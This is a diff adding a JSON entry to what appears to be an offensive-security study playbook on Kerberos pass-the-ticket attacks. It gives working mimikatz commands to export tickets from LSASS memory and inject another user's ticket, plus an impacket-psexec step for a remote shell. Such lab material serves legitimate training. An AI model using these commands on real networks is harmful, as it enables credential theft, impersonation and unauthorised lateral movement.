@@ -1,0 +1,42 @@
+{
+  "id": "pass_the_ticket",
+  "phase": "AD",
+  "title": "Pass-the-Ticket — Steal and Inject Kerberos Tickets",
+  "body": "Pass-the-Ticket abuses Kerberos tickets that already exist in LSASS memory. You export every TGT/TGS on a compromised host and inject a useful one into YOUR session — letting you access resources as whoever owned that ticket.\n\nKEY DISTINCTION (TGT vs TGS):\n  - A TGT is not bound to a host — reuse it within its lifetime (~10h) to request TGSs for many services. Stealing a TGT = full impersonation of that user.\n  - A TGS is bound to ONE service (SPN). Stealing a TGS gets you that one service, nothing else.\n  - If the ticket belongs to the CURRENT user, NO admin rights are needed to inject it. Stealing OTHER users' tickets from LSASS needs admin (you're reading another session's memory).\n\nTHE CLASSIC SCENARIO (from the module):\n  You're jen. dave has a session on the same box and dave has access to \\\\web04\\backup that jen doesn't. You can't read the folder as jen. So: export all tickets, find dave's cifs/web04 TGS, inject it into your session, and now `ls \\\\web04\\backup` works — you're using dave's ticket without ever knowing dave's password or hash.\n\nWHY THIS OVER OVERPASS:\n  - Overpass needs the user's HASH. Pass-the-ticket needs only their TICKET sitting in memory — you never touch their credential.\n  - Great when a privileged user has an active/cached session but you can't dump a crackable secret.\n\nThe tickets are saved as .kirbi files. Pick a TGS in the user@service-host.kirbi format (or a TGT for full impersonation) and inject with kerberos::ptt.",
+  "cmd": "# ══════════════════════════════════════════════════\n# STEP 1 — confirm you're blocked as your current user\n# ══════════════════════════════════════════════════\nPS> whoami                       # corp\\jen\nPS> ls \\\\web04\\backup            # Access denied — jen has no rights\n\n# ══════════════════════════════════════════════════\n# STEP 2 — export every ticket in LSASS to .kirbi files\n# ══════════════════════════════════════════════════\nmimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export\n# writes [...]-dave@krbtgt-CORP.COM.kirbi (TGT) and [...]-dave@cifs-web04.kirbi (TGS) etc.\n\n# List what dropped:\nPS> dir *.kirbi\n\n# ══════════════════════════════════════════════════\n# STEP 3 — inject the ticket you want\n# ══════════════════════════════════════════════════\n# A TGS for the exact service you need (dave's access to web04's CIFS):\nmimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n#   * File: '...': OK\n\n# (or inject dave's TGT for full impersonation of dave everywhere)\n\n# ══════════════════════════════════════════════════\n# STEP 4 — verify and use\n# ══════════════════════════════════════════════════\nPS> klist                        # now shows Client: dave, Server: cifs/web04\nPS> ls \\\\web04\\backup            # works — you're using dave's ticket\n\n# ══════════════════════════════════════════════════\n# FROM KALI — impacket pass-the-ticket\n# ══════════════════════════════════════════════════\n# Convert .kirbi -> .ccache if needed, then:\nexport KRB5CCNAME=dave.ccache\nimpacket-psexec -k -no-pass corp.com/dave@web04.corp.com\n# or any -k aware impacket tool (smbclient, secretsdump, etc.)\n\n# ══════════════════════════════════════════════════\n# RELATED — purge tickets before forging (golden/silver)\n# ══════════════════════════════════════════════════\nmimikatz # kerberos::purge      # clear current session's tickets\nmimikatz # klist                 # confirm empty before injecting a forged one",
+  "warn": "Stealing OTHER users' tickets from LSASS requires local admin (you're reading another logon session's memory). Injecting a ticket that belongs to your own current user does not. Exported .kirbi files are live credentials — treat them like passwords and clean them up.",
+  "choices": [
+    {
+      "label": "Only have the hash, not a ticket — overpass-the-hash",
+      "next": "overpass_the_hash"
+    },
+    {
+      "label": "Have krbtgt's hash — forge a golden ticket",
+      "next": "golden_ticket"
+    },
+    {
+      "label": "Have a service hash — forge a silver ticket",
+      "next": "silver_tickets"
+    },
+    {
+      "label": "Use the ticket to get a shell — PsExec",
+      "next": "psexec_lateral"
+    },
+    {
+      "label": "Where do tickets come from? — mimikatz",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Got access — re-enumerate as the new context",
+      "next": "bloodhound_authenticated"
+    },
+    {
+      "label": "Back to lateral movement overview",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
